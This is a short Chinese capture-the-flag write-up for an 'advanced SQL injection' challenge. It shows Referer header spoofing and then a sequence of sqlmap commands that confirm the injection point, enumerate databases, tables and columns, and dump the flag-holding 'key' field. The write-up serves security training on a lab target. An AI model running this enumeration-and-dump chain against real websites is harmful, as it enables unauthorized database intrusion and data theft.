11.SQL注入高级

题目：

解题过程：

遇到这种情况就抓包看看


在HTTP里面Referer表示跳转链接的来源，所以把它的值改成http://www.bluedon.com

能够跳转，查看源码发现url接的是id，尝试id=1能够正常访问，

猜测为注入点

然后祭出神器sqlmap

判断是否存在注入点

sqlmap -u "http:///stage/11/6C9428036D386316.php?id=1" --referer "www.bluedon.com"

确实是注入点

查看数据库

sqlmap -u "http:///stage/11/6C9428036D386316.php?id=1" --referer "www.bluedon.com" --dbs

查看inject_xiaoshiniudao2里面的数据表

sqlmap -u "http:///stage/11/6C9428036D386316.php?id=1" --referer "www.bluedon.com" -D inject_xiaoshiniudao2 --tables

查看key表的字段

sqlmap -u "http:///stage/11/6C9428036D386316.php?id=1" --referer "www.bluedon.com" -D inject_xiaoshiniudao2 -T key --columns

把key字段的内容dump出来

sqlmap -u "http:///stage/11/6C9428036D386316.php?id=1" --referer "www.bluedon.com" -D inject_xiaoshiniudao2 -T key -C key --dump
